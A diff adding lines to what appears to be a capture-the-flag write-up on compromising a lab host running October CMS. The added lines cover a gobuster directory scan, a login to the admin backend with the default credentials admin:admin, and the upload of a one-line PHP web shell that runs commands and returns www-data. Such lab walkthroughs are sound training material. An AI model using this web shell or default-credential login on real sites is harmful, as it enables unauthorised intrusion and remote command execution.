@@ -12,4 +12,20 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.7 (Ubuntu)
 |_http-title: October CMS - Vanilla
 
-A full port scan reveals only the two ports.
+A full port scan reveals only the two ports. We need to run a directory bruteforce here
+gobuster dir -u http://10.10.10.16 -w /usr/share/wordlists/directory-list-2.3-medium.txt
+/blog
+/forum
+/themes
+/modules
+/account
+/tests
+/storage
+/plugins
+/backend
+/backend/auth
+
+We proceed to admin portal at http://10.10.10.16/backend/auth and try the default creds, admin:admin and we are logged in.
+Now we create a simple php shell <?php system($_GET['cmd']);?> as shell.php5, upload it and see if we get a reverse shell.
+And sure enough visiting : http://10.10.10.16/storage/app/media/shell.php5?cmd=id gives : uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
